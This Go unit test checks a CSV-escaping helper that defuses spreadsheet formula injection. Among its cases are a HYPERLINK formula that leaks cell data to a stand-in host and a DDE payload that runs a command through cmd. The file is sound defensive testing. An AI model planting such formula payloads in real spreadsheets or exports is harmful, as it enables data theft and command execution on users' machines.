package app

import "testing"

func TestCSVSafeNeutralisesFormulas(t *testing.T) {
	cases := []struct {
		name  string
		value string
		want  string
	}{
		{"plain text", "전표 검증 자동화", "전표 검증 자동화"},
		{"empty", "", ""},
		{"equals", "=1+1", "'=1+1"},
		{"hyperlink exfiltration", `=HYPERLINK("http://x/?d="&A1,"클릭")`, `'=HYPERLINK("http://x/?d="&A1,"클릭")`},
		{"plus", "+41-1", "'+41-1"},
		{"at sign", "@SUM(1+1)", "'@SUM(1+1)"},
		{"dde command", `-2+3+cmd|' /C calc'!A0`, `'-2+3+cmd|' /C calc'!A0`},
		{"tab", "\t=1+1", "'\t=1+1"},
		{"carriage return", "\r=1+1", "'\r=1+1"},
		// Bullet lines are how people actually write these fields, and no
		// payload can begin with an operator followed by whitespace.
		{"hyphen bullet", "- 서버 점검", "- 서버 점검"},
		{"hyphen bullet with tab", "-\t서버 점검", "-\t서버 점검"},
		{"lone hyphen", "-", "-"},
		{"negative number", "-41", "'-41"},
		{"hyphen then korean", "-서버 점검", "'-서버 점검"},
	}
	for _, item := range cases {
		if got := csvSafe(item.value); got != item.want {
			t.Errorf("%s: csvSafe(%q)=%q want=%q", item.name, item.value, got, item.want)
		}
	}
}

func TestCSVSafeRowGuardsEveryCell(t *testing.T) {
	row := csvSafeRow([]string{"운영", "=1+1", "admin", "@SUM(1)", "- 계획", ""})
	want := []string{"운영", "'=1+1", "admin", "'@SUM(1)", "- 계획", ""}
	for index := range want {
		if row[index] != want[index] {
			t.Fatalf("cell %d: got=%q want=%q", index, row[index], want[index])
		}
	}
}
